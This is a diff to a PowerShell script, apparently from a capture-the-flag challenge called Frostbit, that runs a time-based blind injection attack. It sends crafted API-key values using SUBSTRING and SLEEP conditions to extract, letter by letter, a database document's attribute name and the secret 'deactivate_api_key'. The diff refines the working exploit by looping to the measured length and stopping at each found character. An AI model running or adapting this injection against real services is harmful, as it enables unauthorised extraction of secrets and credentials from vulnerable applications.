@@ -89,7 +89,7 @@ function Is-UUID {
 # Explicity cast each array object to a string since powershell will create
 # a mixed-object array.
 #
-$letters = @('a'..'z') + ('A'..'Z') + ('0'..'9') + '-' + '_'
+$letters = @('a'..'z') + ('0'..'9') + '-' + '_'
 $letters = $letters | ForEach-Object { [string]$_ }
 
 # Set our default SLEEP() operation sleep time in seconds.
@@ -126,6 +126,8 @@ $sleeperrormargin = $sleepytimems * 0.98
 
 $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
 $session.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
+
+$len = 0
 
 "Starting Frostbit Deactivation Attack for BotUUID $botuuid and SQLi SLEEP($sleepytime) on $(Get-Date)"
 
@@ -212,13 +214,14 @@ foreach($key in $list) {
     
     if($sw.ElapsedMilliseconds -ge $sleeperrormargin){
         "Length of key in doc: " + $_
+        $len = $_ - 1
     }
 }
 
 
 $name = ""
 "`nTrying to find the name of the attribute in doc[0] excluding system keys: "
-foreach($pos in 0..17){
+foreach($pos in 0..$len){
     foreach($letter in $letters){
         $apikey = "`' OR SUBSTRING(ATTRIBUTES(doc, true)[0], $pos, 1) == `"$letter`" ? SLEEP($sleepytime) : `'"
     
@@ -235,12 +238,12 @@ foreach($pos in 0..17){
     
         if($sw.ElapsedMilliseconds -ge $sleeperrormargin){
             $name += $letter
+            break
         }
     }
 }
 "Found: " + $name
 
-#deactivate_api_key
 
 "`nTrying to find length of the attribute value in doc.deactivate_api_key: "
 0..64 | % {
@@ -258,13 +261,14 @@ foreach($pos in 0..17){
     $sw.Stop()
 
     if($sw.ElapsedMilliseconds -ge $sleeperrormargin){
-        "Length of key in doc: " + $_
+        "Length of key's value in doc: " + $_
+        $len = $_ - 1
     }
 }
 
 $name = ""
 "`nTrying to find the grand-prize, the value of deactivate_api_key: "
-foreach($pos in 0..36){
+foreach($pos in 0..$len){
     foreach($letter in $letters){
         $apikey = "`' OR SUBSTRING(doc.deactivate_api_key, $pos, 1) == `"$letter`" ? SLEEP($sleepytime) : `'"
     
@@ -281,6 +285,7 @@ foreach($pos in 0..36){
     
         if($sw.ElapsedMilliseconds -ge $sleeperrormargin){
             $name += $letter
+            break
         }
     }
 }
